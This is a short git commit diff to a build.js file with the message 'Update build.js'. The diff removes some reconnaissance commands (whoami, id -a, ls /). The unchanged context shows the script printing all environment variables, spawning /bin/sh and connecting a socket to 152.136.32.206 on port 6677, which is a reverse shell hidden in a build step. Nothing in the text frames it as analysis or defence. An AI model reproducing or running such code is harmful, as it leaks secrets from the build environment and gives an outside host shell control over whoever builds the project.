ef67d7b42abe7c34c0163ce1759b7bcb7dcf3671
yoshino-s <cy-cui@outlook.com>
2025-07-07 18:06:04 +0800

    Update build.js

--- build.js
+++ build.js
@@ -10,10 +10,6 @@ function run(command) {
 console.log("Env:");
 console.log(process.env);
 
-run("whoami");
-run("id -a");
-run("ls /");
-
 const sh = child_process.spawn("/bin/sh", []);
 var client = new net.Socket();
 client.connect(6677, "152.136.32.206", function () {
